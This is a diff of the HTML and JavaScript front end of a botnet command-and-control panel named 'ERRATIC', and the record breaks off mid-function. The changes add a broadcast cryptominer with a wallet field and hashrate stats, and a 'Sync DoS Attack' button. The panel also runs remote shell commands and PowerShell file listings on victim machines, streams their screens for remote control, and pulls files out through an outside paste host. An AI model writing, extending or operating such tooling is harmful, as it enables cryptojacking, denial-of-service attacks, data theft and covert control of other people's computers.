@@ -2,413 +2,430 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>C2 Dashboard</title>
+    <title>ERRATIC | C2 Control</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
     <style>
-        body, html { margin: 0; padding: 0; font-family: 'Roboto', sans-serif; background-color: #1a1a1a; color: #e0e0e0; }
-        body { display: flex; flex-direction: column; min-height: 100vh; }
-        nav { background-color: #222; padding: 1rem 2rem; display: flex; justify-content: space-between; align-items: center; }
-        nav a { color: #ccc; text-decoration: none; margin-right: 1rem; transition: color 0.3s;}
-        nav a:hover { color: #fff; }
-        .container { display: flex; flex-grow: 1; padding: 2rem; gap: 2rem; }
-
-        .client-list { flex: 0 0 250px; padding: 1rem; background-color: #282828; border-radius: 8px; box-shadow: 0 2px 5px rgba(0,0,0,0.2); overflow-y: auto; max-height: calc(100vh - 4rem - 3rem); }
-        .client-list h2 { margin-top:0; margin-bottom: 1rem; border-bottom: 1px solid #333; padding-bottom: .5rem; }
-
-        .client {
-            padding: 10px; border-radius: 4px; cursor: pointer; transition: all 0.2s ease;
-            margin-bottom: 10px; display: flex; flex-direction: column; align-items: flex-start;
-            border: 1px solid #444;
+        :root {
+            --bg: #000000;
+            --sidebar: #0a0000;
+            --panel: #120000;
+            --accent: #ff0000; 
+            --accent-muted: #4a0000;
+            --text: #ffffff;
+            --text-muted: #888888;
+            --border: #220000;
         }
 
-        .client.offline { background-color: #2a2a2a; border-color: #333; opacity: 0.6; cursor: not-allowed; }
-        .client.online { background-color: #2d3a2d; border-left: 5px solid #4CAF50; }
-        .client.selected { background-color: #f1c40f !important; color: #000 !important; border-color: #d4ac0d; }
+        * { box-sizing: border-box; }
+        body, html { margin: 0; padding: 0; font-family: 'Inter', sans-serif; background-color: var(--bg); color: var(--text); height: 100vh; overflow: hidden; }
 
-        .client-header { display: flex; width: 100%; justify-content: space-between; align-items: center; }
-        .client-alias { font-weight: bold; font-size: 1rem; }
+        .app-container { display: grid; grid-template-columns: 300px 1fr; height: 100vh; }
 
-        .client-desc {
-            font-size: 0.8rem; color: #bbb; margin-top: 4px;
-            white-space: nowrap; overflow: hidden; text-overflow: ellipsis;
-            max-width: 180px; transition: all 0.3s ease;
-        }
-        .client:hover .client-desc { white-space: normal; overflow: visible; max-width: 100%; color: #fff; }
-        .client.selected .client-desc { color: #333; }
+        /* Sidebar */
+        .sidebar { background: var(--sidebar); border-right: 1px solid var(--border); display: flex; flex-direction: column; height: 100vh; }
+        .sidebar-header { padding: 1.5rem; border-bottom: 1px solid var(--border); font-weight: 800; font-size: 1.5rem; color: var(--accent); letter-spacing: 2px; text-shadow: 0 0 10px var(--accent); }
+        .global-control-panel { padding: 1rem; border-bottom: 1px solid var(--border); background: #050000; }
+        .client-list { flex: 1; overflow-y: auto; padding: 1rem; scrollbar-width: thin; scrollbar-color: var(--accent) var(--bg); }
+        .client-list h3 { font-size: 0.75rem; text-transform: uppercase; color: var(--text-muted); margin-bottom: 1rem; }
 
-        .client-screenshot-preview { width: 40px; height: 25px; border-radius: 2px; overflow: hidden; background: #000; }
-        .client-screenshot-preview img { width: 100%; height: 100%; object-fit: cover; }
+        .client-card { background: var(--panel); border: 1px solid var(--border); border-radius: 4px; padding: 12px; margin-bottom: 10px; cursor: pointer; transition: all 0.2s; }
+        .client-card:hover { border-color: var(--accent); }
+        .client-card.selected { border-color: var(--accent); box-shadow: inset 0 0 10px rgba(255,0,0,0.2); }
+        .client-card.offline { opacity: 0.4; filter: grayscale(1); }
 
-        .main-content-area { flex: 1; display: flex; flex-direction: column; gap: 2rem; overflow-y: auto; max-height: calc(100vh - 4rem - 3rem); }
-        .command-area, .stress-test-area, .file-explorer-area { padding: 1rem; background-color: #282828; border-radius: 8px; box-shadow: 0 2px 5px rgba(0,0,0,0.2); display: none; flex-direction: column; }
-        .command-area h2, .stress-test-area h2, .file-explorer-area h2 { margin-top:0; margin-bottom: 1rem; border-bottom: 1px solid #333; padding-bottom: .5rem; }
+        .status-dot { width: 8px; height: 8px; border-radius: 50%; display: inline-block; margin-right: 8px; }
+        .online .status-dot { background: var(--accent); box-shadow: 0 0 8px var(--accent); animation: pulse 1.5s infinite; }
+        .offline .status-dot { background: #333; }
+        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
 
-        .metadata-editor { background: #333; padding: 12px; border-radius: 6px; margin-bottom: 15px; border: 1px solid #444; }
-        .metadata-editor label { font-size: 0.8rem; color: #f1c40f; display: block; margin-bottom: 4px; }
-        .metadata-editor input, .metadata-editor textarea {
-            width: 100%; background: #1a1a1a; color: white; border: 1px solid #555;
-            padding: 8px; margin-bottom: 8px; border-radius: 4px; box-sizing: border-box;
-        }
+        /* Layout */
+        .main-view { display: flex; flex-direction: column; overflow: hidden; }
+        .top-nav { height: 60px; background: var(--sidebar); border-bottom: 1px solid var(--border); display: flex; align-items: center; justify-content: space-between; padding: 0 2rem; }
+        .stats-bar { display: flex; background: #050000; border-bottom: 1px solid var(--border); padding: 10px 2rem; gap: 3rem; }
+        .stat-item { display: flex; flex-direction: column; }
+        .stat-label { font-size: 0.7rem; color: var(--text-muted); text-transform: uppercase; }
+        .stat-value { color: var(--accent); font-weight: bold; font-family: 'JetBrains Mono'; font-size: 1.1rem; }
 
-        #command-input { width: 100%; padding: 0.8rem; margin-bottom: 1rem; background-color: #333; color: #fff; border: none; border-radius: 4px; box-sizing: border-box; }
-        #command-output { border: 1px solid #333; min-height: 100px; max-height: 250px; padding: 1rem; border-radius: 4px; overflow-y: auto; background-color: #333; margin-bottom: 1rem; white-space: pre-wrap; font-family: monospace; font-size: 0.9rem; }
-        #screenshot-area { display: none; margin-top: 1rem;}
-        #screenshot-area img { max-width: 100%; border: 1px solid #333; border-radius: 4px; }
+        .tabs { display: flex; background: var(--sidebar); padding: 0 1rem; gap: 0.5rem; border-bottom: 1px solid var(--border); }
+        .tab-btn { padding: 15px 20px; border: none; background: none; color: var(--text-muted); cursor: pointer; font-weight: 600; border-bottom: 2px solid transparent; }
+        .tab-btn.active { color: var(--accent); border-bottom-color: var(--accent); }
 
-        button { background-color: #5cb85c; color: #fff; border: none; padding: 0.8rem 1.5rem; border-radius: 4px; cursor: pointer; transition: background-color 0.3s; margin-right: 0.5rem; margin-bottom: 0.5rem;}
-        button:hover { background-color: #4cae4c; }
+        .content-area { flex: 1; padding: 1.5rem; overflow-y: auto; display: none; flex-direction: column; gap: 1.5rem; }
+        .content-area.active { display: flex; }
 
-        .macro-btn { background-color: #444; border: 1px solid #666; font-size: 0.85rem; padding: 0.5rem 1rem; position: relative; }
-        .macro-btn:hover { background-color: #555; }
-        .macro-delete { position: absolute; top: -5px; right: -5px; background: #e74c3c; border-radius: 50%; width: 18px; height: 18px; line-height: 14px; text-align: center; font-size: 12px; cursor: pointer; }
-        .macro-container { display: flex; flex-wrap: wrap; gap: 10px; margin-top: 10px; border-top: 1px solid #444; padding-top: 15px; }
+        /* Terminal */
+        .terminal-container { background: #000; border: 1px solid var(--border); display: flex; flex-direction: column; flex: 1; min-height: 400px; }
+        #command-output { flex: 1; padding: 1.5rem; font-family: 'JetBrains Mono'; font-size: 0.85rem; overflow-y: auto; color: #ff3333; border-bottom: 1px solid var(--border); white-space: pre-wrap; }
+        #command-input { background: none; border: none; color: white; font-family: 'JetBrains Mono'; padding: 15px; width: 100%; outline: none; }
 
-        #file-list-container { max-height: 400px; overflow-y: auto; background: #1a1a1a; border: 1px solid #333; border-radius: 4px; margin-top: 10px; }
-        .file-item { padding: 8px 12px; border-bottom: 1px solid #333; cursor: pointer; display: flex; justify-content: space-between; align-items: center; }
-        .file-item:hover { background: #222; }
-        .file-info { display: flex; align-items: center; gap: 10px; }
-        .file-name { font-family: monospace; }
-        .file-type-icon { color: #f1c40f; }
-        .file-actions button { padding: 4px 8px; font-size: 0.75rem; margin: 0; }
+        /* Explorer Restored */
+        .file-browser { background: var(--panel); border: 1px solid var(--border); border-radius: 4px; overflow: hidden; }
+        .file-header { padding: 1rem; background: var(--sidebar); border-bottom: 1px solid var(--border); display: flex; justify-content: space-between; align-items: center; }
+        .file-item { display: flex; align-items: center; padding: 10px 15px; border-bottom: 1px solid var(--border); cursor: pointer; }
+        .file-item:hover { background: rgba(255,0,0,0.1); }
+        .file-icon { margin-right: 12px; font-size: 1.2rem; }
+        .file-meta { flex: 1; }
+        .file-name { font-size: 0.9rem; font-family: 'JetBrains Mono'; color: #fff; }
 
-        #control-overlay { display: none; position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: rgba(0, 0, 0, 0.95); z-index: 9999; flex-direction: column; justify-content: center; align-items: center; cursor: crosshair; }
-        #control-image { max-width: 95%; max-height: 85%; border: 2px solid #f1c40f; }
-        #control-status { color: #f1c40f; margin-top: 15px; font-size: 1.2rem; font-weight: bold; font-family: monospace; }
+        .btn-primary { background: var(--accent); color: white; border: none; padding: 8px 15px; cursor: pointer; font-weight: bold; }
+        .btn-secondary { background: #111; border: 1px solid var(--border); color: #fff; padding: 5px 10px; cursor: pointer; font-size: 0.75rem; }
+        .btn-danger { background: #440000; color: white; border: 1px solid red; padding: 8px 15px; cursor: pointer; }
+        .meta-input { background: #000; border: 1px solid var(--border); color: white; padding: 8px; width: 100%; margin-top: 5px; }
+        
+        /* Remote Desktop Overlay */
+        #control-overlay { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: rgba(0,0,0,0.98); z-index: 1000; display: none; flex-direction: column; align-items: center; justify-content: center; }
+        #control-image { max-height: 90vh; border: 2px solid var(--accent); cursor: crosshair; background: #000; }
 
-        footer { text-align: center; padding: 1rem 0; background-color: #222; margin-top: auto;}
+        ::-webkit-scrollbar { width: 5px; }
+        ::-webkit-scrollbar-track { background: var(--bg); }
+        ::-webkit-scrollbar-thumb { background: var(--accent-muted); }
     </style>
 </head>
 <body>
-    <nav>
-        <a href="/dashboard" style="font-weight: bold; color: white;">C2 Dashboard</a>
-        <a href="/logout">Logout</a>
-    </nav>
 
-    <div id="control-overlay">
-        <img id="control-image" src="" alt="Remote Control Stream">
-        <div id="control-status">REMOTE CONTROL ACTIVE - ESC TO EXIT</div>
-    </div>
+<div id="control-overlay">
+    <div style="margin-bottom: 10px; font-weight: bold; color: var(--accent); letter-spacing: 2px;">REMOTE SESSION ACTIVE | ESC TO EXIT</div>
+    <img id="control-image" src="" alt="Live Stream">
+</div>
 
-    <div class="container">
+<div class="app-container">
+    <div class="sidebar">
+        <div class="sidebar-header">ERRATIC</div>
+        
+        <div class="global-control-panel">
+            <h3 style="font-size: 0.6rem; color: var(--accent); margin: 0 0 8px 0;">NETWORK BROADCAST</h3>
+            <input type="text" id="global-miner-wallet" placeholder="Broadcast Wallet Address" class="meta-input" style="margin-bottom: 8px; font-size: 0.7rem;">
+            <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 5px;">
+                <button class="btn-primary" onclick="broadcastMining('start')" style="font-size: 0.7rem;">Start All</button>
+                <button class="btn-danger" onclick="broadcastMining('stop')" style="font-size: 0.7rem;">Kill All</button>
+            </div>
+            <button onclick="broadcastStress()" style="width: 100%; margin-top: 5px; background: #200; color: red; border: 1px solid red; font-size: 0.7rem; cursor: pointer; padding: 5px;">Sync DoS Attack</button>
+        </div>
+
         <div class="client-list">
-            <h2>Clients:</h2>
-            <ul id="clients" style="list-style-type: none; padding: 0;"></ul>
-        </div>
-
-        <div class="main-content-area">
-            <div class="command-area" id="command-area">
-                <h2>Control: <span id="selected-client-name">None</span> <small id="conn-status-indicator" style="font-size: 0.8rem; margin-left: 10px;"></small></h2>
-
-                <div class="metadata-editor">
-                    <label>Alias</label>
-                    <input type="text" id="edit-alias">
-                    <label>Description</label>
-                    <textarea id="edit-desc" rows="2"></textarea>
-                    <button onclick="saveMetadata()" style="background-color: #f1c40f; color: black; font-weight: bold;">Save Identity</button>
-                </div>
-
-                <div class="controls">
-                    <input type="text" id="command-input" placeholder="Type a shell command..." onkeydown="if(event.key === 'Enter') sendCommand();">
-                    <div style="display: flex; flex-wrap: wrap;">
-                        <button onclick="sendCommand()">Execute</button>
-                        <button onclick="enterControlMode()" style="background-color: #e67e22;">Remote Desktop</button>
-                        <button onclick="toggleFileExplorer()" style="background-color: #3498db;">File Explorer</button>
-                        <button onclick="toggleStressTester()" style="background-color: #e74c3c;">Stress Tester</button>
-                    </div>
-                </div>
-
-                <div id="macro-section">
-                    <div style="display: flex; gap: 5px; margin-top: 10px;">
-                        <input type="text" id="new-macro-name" placeholder="Macro Name" style="flex:1; padding: 5px; background:#333; color:white; border:1px solid #555;">
-                        <input type="text" id="new-macro-cmd" placeholder="Command" style="flex:2; padding: 5px; background:#333; color:white; border:1px solid #555;">
-                        <button onclick="addMacro()" style="background-color: #9b59b6; margin:0; padding: 5px 15px;">Add Macro</button>
-                    </div>
-                    <div class="macro-container" id="macro-container"></div>
-                </div>
-
-                <div id="command-output"></div>
-
-                <div id="screenshot-area">
-                    <img id="screenshot-image" src="" alt="Client Screenshot">
-                </div>
-            </div>
-
-            <div class="stress-test-area" id="stress-test-area">
-                <h2>Network Stress Tester (Broadcast)</h2>
-                <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-bottom: 15px;">
-                    <div>
-                        <label style="font-size: 0.8rem; color: #bbb;">Target Host</label>
-                        <input type="text" id="stress-host" placeholder="1.1.1.1" style="width:100%; background:#333; color:white; border:none; padding:8px; border-radius:4px;">
-                    </div>
-                    <div>
-                        <label style="font-size: 0.8rem; color: #bbb;">Target Port</label>
-                        <input type="number" id="stress-port" value="80" style="width:100%; background:#333; color:white; border:none; padding:8px; border-radius:4px;">
-                    </div>
-                    <div>
-                        <label style="font-size: 0.8rem; color: #bbb;">Method</label>
-                        <select id="stress-method" style="width:100%; background:#333; color:white; border:none; padding:8px; border-radius:4px;">
-                            <option value="ping">ICMP Ping</option>
-                            <option value="http_get">HTTP GET Flood</option>
-                            <option value="tcp_conn">TCP Connection Flood</option>
-                        </select>
-                    </div>
-                    <div>
-                        <label style="font-size: 0.8rem; color: #bbb;">Iterations per client</label>
-                        <input type="number" id="stress-count" value="100" style="width:100%; background:#333; color:white; border:none; padding:8px; border-radius:4px;">
-                    </div>
-                </div>
-                <button onclick="launchStressTest()" style="background-color: #c0392b; width: 100%;">LAUNCH BROADCAST</button>
-            </div>
-
-            <div class="file-explorer-area" id="file-explorer-area">
-                <div style="display: flex; justify-content: space-between;">
-                    <h2>File Explorer</h2>
-                    <button onclick="refreshFiles()" style="background-color: #2ecc71;">Refresh</button>
-                </div>
-                <div id="current-path-display" style="font-family: monospace; background: #000; padding: 5px; border-radius: 4px; margin-bottom: 10px; color: #4CAF50;">C:\</div>
-                <div id="file-list-container"></div>
-            </div>
+            <h3>Connected Nodes</h3>
+            <div id="clients"></div>
         </div>
     </div>
 
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.7.4/socket.io.min.js"></script>
-    <script>
-        {% raw %}
-        const socket = io('/api');
-        let current_client_id = null;
-        let current_client_hostname = null;
-        let allConnectedClients = [];
-        let isControlMode = false;
-        let commandHistory = {};
-        let clientStates = {};
+    <div class="main-view">
+        <div class="top-nav">
+            <div id="node-title" style="font-weight: 700; color: var(--accent);">SELECT A NODE</div>
+            <div id="conn-status-indicator" style="font-size: 0.7rem;"></div>
+        </div>
 
-        const DIR_JSON_MARKER = '##DIR_JSON##';
-        const MICROBIN_URL_BASE = 'https://microbin.elaptic.dev/';
+        <div class="stats-bar">
+            <div class="stat-item">
+                <span class="stat-label">Network Hashrate</span>
+                <span class="stat-value" id="net-hashrate">0.00 H/s</span>
+            </div>
+            <div class="stat-item">
+                <span class="stat-label">Total Shares</span>
+                <span class="stat-value" id="net-shares">0</span>
+            </div>
+            <div class="stat-item">
+                <span class="stat-label">Active Workers</span>
+                <span class="stat-value" id="net-workers">0</span>
+            </div>
+        </div>
 
-        socket.on('connect', () => { socket.emit('join_dashboard'); });
+        <div class="tabs">
+            <button class="tab-btn active" onclick="switchTab('tab-terminal')">Console</button>
+            <button class="tab-btn" onclick="switchTab('tab-files')">Files</button>
+            <button class="tab-btn" onclick="switchTab('tab-tools')">Miner</button>
+            <button class="tab-btn" onclick="switchTab('tab-identity')">Identity</button>
+        </div>
 
-        socket.on('macro_list', (macros) => {
-            const container = document.getElementById('macro-container');
-            container.innerHTML = '';
-            macros.forEach(m => {
-                const btnWrap = document.createElement('div');
-                btnWrap.style.position = 'relative';
-                const btn = document.createElement('button');
-                btn.className = 'macro-btn';
-                btn.textContent = m.name;
-                btn.onclick = () => { if(current_client_id) socket.emit('command', { 'command': m.command, 'client_id': current_client_id }); };
-                const del = document.createElement('div');
-                del.className = 'macro-delete';
-                del.innerHTML = '&times;';
-                del.onclick = (e) => { e.stopPropagation(); socket.emit('delete_macro', {id: m.id}); };
-                btnWrap.appendChild(btn);
-                btnWrap.appendChild(del);
-                container.appendChild(btnWrap);
-            });
+        <!-- TABS -->
+        <div id="tab-terminal" class="content-area active">
+            <div style="display: flex; gap: 1rem; height: 100%;">
+                <div style="flex: 2; display: flex; flex-direction: column;">
+                    <div class="terminal-container">
+                        <div id="command-output">Awaiting input...</div>
+                        <input type="text" id="command-input" placeholder="Execute command..." onkeydown="if(event.key === 'Enter') sendCommand();">
+                    </div>
+                </div>
+                <div style="flex: 1; display: flex; flex-direction: column; gap: 1rem;">
+                    <div style="background: var(--panel); padding: 1rem; border: 1px solid var(--border);">
+                        <h4 style="margin:0 0 10px 0; font-size: 0.7rem; color: var(--accent);">LIVE MONITOR</h4>
+                        <img id="screenshot-image" style="width:100%; border: 1px solid var(--border); cursor: pointer; background:#000;" onclick="enterControlMode()">
+                        <button class="btn-primary" style="width:100%; margin-top:10px" onclick="enterControlMode()">Remote Desktop</button>
+                    </div>
+                    <div style="background: var(--panel); padding: 1rem; border: 1px solid var(--border);">
+                        <h4 style="margin:0 0 10px 0; font-size: 0.7rem; color: var(--accent);">NODE INTEL</h4>
+                        <div style="font-family: 'JetBrains Mono'; font-size: 0.8rem; line-height: 1.8;">
+                            Mining: <span id="node-stat-mining" style="color:var(--accent)">Null</span><br>
+                            Rate: <span id="node-stat-rate" style="color:var(--accent)">0 H/s</span><br>
+                            Shares: <span id="node-stat-shares" style="color:var(--accent)">0</span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div id="tab-files" class="content-area">
+            <div class="file-browser">
+                <div class="file-header">
+                    <div id="current-path-display" style="font-family: 'JetBrains Mono'; font-size: 0.8rem; color: var(--accent);">C:\</div>
+                    <button class="btn-primary" onclick="refreshFiles()" style="font-size: 0.7rem;">Refresh</button>
+                </div>
+                <div id="file-list-container" style="max-height: 600px; overflow-y: auto;"></div>
+            </div>
+        </div>
+
+        <div id="tab-tools" class="content-area">
+             <div style="background: var(--panel); border: 1px solid var(--border); padding: 1rem;">
+                <h4>Node Miner</h4>
+                <input type="text" id="miner-wallet" placeholder="Wallet Address" class="meta-input">
+                <div style="margin-top: 10px; display: flex; gap: 10px;">
+                    <button class="btn-primary" onclick="runMiner('start')">Start</button>
+                    <button class="btn-danger" onclick="runMiner('stop')">Stop</button>
+                </div>
+             </div>
+        </div>
+
+        <div id="tab-identity" class="content-area">
+            <div style="background: var(--panel); border: 1px solid var(--border); padding: 1rem;">
+                <h4>Node Alias</h4>
+                <input type="text" id="edit-alias" class="meta-input">
+                <h4 style="margin-top:20px">Description</h4>
+                <textarea id="edit-desc" class="meta-input" rows="4"></textarea>
+                <button class="btn-primary" style="margin-top: 15px;" onclick="saveMetadata()">Update Identity</button>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.7.4/socket.io.min.js"></script>
+<script>
+    {% raw %}
+    const socket = io('/api');
+    let current_client_id = null;
+    let current_client_hostname = null;
+    let allConnectedClients = [];
+    let isControlMode = false;
+    let commandHistory = {};
+    let clientStates = {}; 
+
+    const HASH_REGEX = /Hashrate:\s+([\d\.]+)\s+H\/s\s+\|\s+Shares:\s+(\d+)/;
+    const STALE_MS = 10000; 
+    const DIR_JSON_MARKER = '##DIR_JSON##';
+    const MICROBIN_URL_BASE = 'https://microbin.elaptic.dev/';
+
+    function switchTab(tabId) {
+        document.querySelectorAll('.content-area').forEach(c => c.classList.remove('active'));
+        document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
+        document.getElementById(tabId).classList.add('active');
+        event.currentTarget.classList.add('active');
+    }
+
+    socket.on('connect', () => { socket.emit('join_dashboard'); });
+
+    socket.on('client_list', (clients) => {
+        allConnectedClients = clients;
+        const list = document.getElementById('clients');
+        list.innerHTML = '';
+        clients.sort((a, b) => (a.online === b.online) ? 0 : a.online ? -1 : 1);
+
+        clients.forEach(client => {
+            const state = clientStates[client.hostname] || { hashrate: 0, lastSeen: 0 };
+            const isMining = (Date.now() - state.lastSeen) < STALE_MS && state.hashrate > 0;
+            const div = document.createElement('div');
+            div.className = `client-card ${client.online ? 'online' : 'offline'} ${(current_client_hostname === client.hostname) ? 'selected' : ''}`;
+            div.innerHTML = `
+                <div style="display:flex; justify-content:space-between; align-items:center;">
+                    <div><span class="status-dot"></span>${client.alias || client.hostname}</div>
+                    ${isMining ? `<span style="font-size:0.6rem; color:red;">${Math.floor(state.hashrate)} H/s</span>` : ''}
+                </div>
+            `;
+            if (client.online) div.onclick = () => selectClient(client);
+            list.appendChild(div);
         });
+        updateGlobalStats();
+    });
 
-        function addMacro() {
-            const name = document.getElementById('new-macro-name').value;
-            const command = document.getElementById('new-macro-cmd').value;
-            if(name && command) {
-                socket.emit('add_macro', {name, command});
-                document.getElementById('new-macro-name').value = '';
-                document.getElementById('new-macro-cmd').value = '';
-            }
+    socket.on('command_output', (data) => {
+        const targetClient = allConnectedClients.find(c => c.id === data.client_id);
+        if (!targetClient) return;
+
+        // 1. FILE SYSTEM HANDLER
+        if (data.output.includes(DIR_JSON_MARKER)) {
+            renderFileSystem(data.output.substring(data.output.indexOf(DIR_JSON_MARKER) + DIR_JSON_MARKER.length));
+            return;
         }
 
-        socket.on('client_list', (clients) => {
-            allConnectedClients = clients;
-            const list = document.getElementById('clients');
-            list.innerHTML = '';
-
-            if (current_client_hostname) {
-                const activeMatch = clients.find(c => c.hostname === current_client_hostname && c.online);
-                const statusIndicator = document.getElementById('conn-status-indicator');
-                if (activeMatch) {
-                    if (current_client_id !== activeMatch.id) {
-                        current_client_id = activeMatch.id;
-                        if (isControlMode) socket.emit('command', { 'command': '#scrsht 100', 'client_id': current_client_id });
-                        if (document.getElementById('file-explorer-area').style.display === 'flex') refreshFiles();
-                    }
-                    statusIndicator.textContent = "(CONNECTED)";
-                    statusIndicator.style.color = "#4CAF50";
-                } else {
-                    statusIndicator.textContent = "(RECONNECTING...)";
-                    statusIndicator.style.color = "#e74c3c";
-                }
-            }
-
-            clients.sort((a, b) => (a.online === b.online) ? 0 : a.online ? -1 : 1);
-            clients.forEach(client => {
-                const li = document.createElement('li');
-                li.className = `client ${client.online ? 'online' : 'offline'} ${(current_client_hostname === client.hostname) ? 'selected' : ''}`;
-                li.innerHTML = `<div class="client-header"><span class="client-alias">${client.alias || client.hostname}</span><div class="client-screenshot-preview"><img src="data:image/jpeg;base64,${client.screenshot_data}"></div></div><div class="client-desc">${client.description || 'No description'}</div>`;
-                if (client.online) {
-                    li.onclick = () => {
-                        current_client_id = client.id;
-                        current_client_hostname = client.hostname;
-                        if (!clientStates[current_client_hostname]) clientStates[current_client_hostname] = { currentPath: "C:\\" };
-                        document.getElementById('command-area').style.display = 'flex';
-                        document.getElementById('selected-client-name').textContent = client.alias || client.hostname;
-                        document.getElementById('edit-alias').value = client.alias || '';
-                        document.getElementById('edit-desc').value = client.description || '';
-                        document.getElementById('screenshot-area').style.display = 'block';
-                        document.getElementById('screenshot-image').src = "data:image/jpeg;base64," + client.screenshot_data;
-                        const outputDiv = document.getElementById('command-output');
-                        outputDiv.textContent = commandHistory[current_client_hostname] || "";
-                        outputDiv.scrollTop = outputDiv.scrollHeight;
-                        if (document.getElementById('file-explorer-area').style.display === 'flex') refreshFiles();
-                        socket.emit('join_dashboard');
-                    };
-                }
-                list.appendChild(li);
-            });
-        });
-
-        function saveMetadata() {
-            socket.emit('update_metadata', { hostname: current_client_hostname, alias: document.getElementById('edit-alias').value, description: document.getElementById('edit-desc').value });
+        // 2. MINING REGEX
+        const match = data.output.match(HASH_REGEX);
+        if (match) {
+            const rate = parseFloat(match[1]);
+            const shares = parseInt(match[2]);
+            if (!clientStates[targetClient.hostname]) clientStates[targetClient.hostname] = {};
+            clientStates[targetClient.hostname].hashrate = rate;
+            clientStates[targetClient.hostname].shares = shares;
+            clientStates[targetClient.hostname].lastSeen = Date.now();
+            updateGlobalStats();
+            if (data.client_id === current_client_id) refreshMiningUI();
         }
 
-        function sendCommand() {
-            const input = document.getElementById('command-input');
-            if (current_client_id && input.value.trim()) {
-                socket.emit('command', { 'command': input.value, 'client_id': current_client_id });
-                input.value = '';
-            }
-        }
-
-        socket.on('command_output', (data) => {
-            if (data.output.includes(DIR_JSON_MARKER)) {
-                const jsonPart = data.output.substring(data.output.indexOf(DIR_JSON_MARKER) + DIR_JSON_MARKER.length);
-                renderFileSystem(jsonPart);
-                return;
-            }
-
-            // Fixed Link Parsing Logic
-            const mbRegex = /https:\/\/microbin\.elaptic\.dev\/p\/[a-zA-Z0-9]+/g;
-            const matches = data.output.match(mbRegex);
-            if (matches) matches.forEach(link => window.open(link, '_blank'));
-
-            const targetClient = allConnectedClients.find(c => c.id === data.client_id);
-            if (targetClient) {
-                if (!commandHistory[targetClient.hostname]) commandHistory[targetClient.hostname] = "";
-                commandHistory[targetClient.hostname] += data.output;
-            }
-            if (data.client_id !== current_client_id) return;
+        // 3. CONSOLE OUTPUT
+        if (!commandHistory[targetClient.hostname]) commandHistory[targetClient.hostname] = "";
+        commandHistory[targetClient.hostname] += data.output;
+        if (data.client_id === current_client_id) {
             const outputDiv = document.getElementById('command-output');
             outputDiv.appendChild(document.createTextNode(data.output));
             outputDiv.scrollTop = outputDiv.scrollHeight;
-        });
-
-        function toggleFileExplorer() {
-            const exp = document.getElementById('file-explorer-area');
-            if (exp.style.display !== 'flex') { exp.style.display = 'flex'; refreshFiles(); } else { exp.style.display = 'none'; }
         }
+    });
 
-        function refreshFiles() {
-            if (!current_client_id || !current_client_hostname || !clientStates[current_client_hostname]) return;
-            const path = clientStates[current_client_hostname].currentPath;
-            const cmd = `powershell -Command "$p='${path.replace(/'/g, "''")}'; if(Test-Path $p){ $items = Get-ChildItem -Path $p | Select-Object Name, @{Name='IsDirectory';Expression={$_.PSIsContainer}}, @{Name='Size';Expression={$_.Length}}; echo '${DIR_JSON_MARKER}' (ConvertTo-Json -InputObject $items) } else { echo '${DIR_JSON_MARKER} []' }"`;
-            socket.emit('command', { 'command': cmd, 'client_id': current_client_id });
+    /* FILE EXPLORER (Original Restored) */
+    function refreshFiles() {
+        if (!current_client_id || !clientStates[current_client_hostname]) return;
+        const path = clientStates[current_client_hostname].currentPath;
+        const cmd = `powershell -Command "$p='${path.replace(/'/g, "''")}'; if(Test-Path $p){ $items = Get-ChildItem -Path $p | Select-Object Name, @{Name='IsDirectory';Expression={$_.PSIsContainer}}, @{Name='Size';Expression={$_.Length}}; echo '${DIR_JSON_MARKER}' (ConvertTo-Json -InputObject $items) } else { echo '${DIR_JSON_MARKER} []' }"`;
+        socket.emit('command', { 'command': cmd, 'client_id': current_client_id });
+    }
+
+    function renderFileSystem(jsonStr) {
+        const container = document.getElementById('file-list-container');
+        const pathDisplay = document.getElementById('current-path-display');
+        let currentPath = clientStates[current_client_hostname].currentPath;
+        pathDisplay.textContent = currentPath;
+        container.innerHTML = '';
+
+        const back = document.createElement('div');
+        back.className = 'file-item';
+        back.innerHTML = `<div class="file-icon">📁</div><div class="file-meta"><div class="file-name">.. (Parent Directory)</div></div>`;
+        back.onclick = () => {
+            const parts = currentPath.split('\\').filter(p => p.length > 0);
+            if (parts.length > 1) { 
+                parts.pop(); 
+                clientStates[current_client_hostname].currentPath = parts.join('\\') + '\\'; 
+                refreshFiles(); 
+            }
+        };
+        container.appendChild(back);
+
+        try {
+            let items = JSON.parse(jsonStr.trim() || "[]");
+            if (!Array.isArray(items)) items = items ? [items] : [];
+            items.forEach(item => {
+                const el = document.createElement('div');
+                el.className = 'file-item';
+                el.innerHTML = `
+                    <div class="file-icon">${item.IsDirectory ? '📁' : '📄'}</div>
+                    <div class="file-meta">
+                        <div class="file-name">${item.Name}</div>
+                        ${!item.IsDirectory ? `<div style="font-size:0.7rem; color:gray">${(item.Size / 1024).toFixed(1)} KB</div>` : ''}
+                    </div>
+                    ${!item.IsDirectory ? `<button class="btn-secondary" onclick="downloadFile('${item.Name.replace(/'/g, "\\'")}', event)">Get</button>` : ''}
+                `;
+                el.onclick = () => {
+                    if (item.IsDirectory) {
+                        clientStates[current_client_hostname].currentPath = currentPath.endsWith('\\') ? currentPath + item.Name + '\\' : currentPath + '\\' + item.Name + '\\';
+                        refreshFiles();
+                    }
+                };
+                container.appendChild(el);
+            });
+        } catch (e) { container.innerHTML = `<div style="padding:20px; color:red">Access Denied.</div>`; }
+    }
+
+    function downloadFile(name, event) {
+        event.stopPropagation();
+        const fullPath = (clientStates[current_client_hostname].currentPath + name).replace(/'/g, "''");
+        const cleanBaseUrl = MICROBIN_URL_BASE.replace(/\/+$/, '');
